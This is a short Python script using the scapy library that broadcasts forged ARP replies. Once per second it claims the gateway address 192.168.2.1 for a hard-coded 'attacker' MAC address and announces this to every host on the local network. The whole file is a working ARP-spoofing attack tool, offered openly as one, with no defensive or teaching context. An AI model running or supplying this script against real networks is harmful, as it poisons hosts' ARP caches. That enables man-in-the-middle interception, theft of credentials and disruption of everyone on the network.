#!/usr/bin/env python
import sys
from scapy.all import *

conf.verb = 0

op = 2
attacker_mac = '34:36:3b:c8:f9:70'
gateway = '192.168.2.1'
target_ip = '255.255.255.255'
target_mac = "ff:ff:ff:ff:ff:ff"

arp = ARP(op=op, psrc=gateway, pdst=target_ip, hwsrc=attacker_mac, hwdst=target_mac)

print "Arp Spoof started.."
try:
    while True:
        send(arp, iface='en0')
        time.sleep(1)
except KeyboardInterrupt:
    print "Arp spoof finished.."
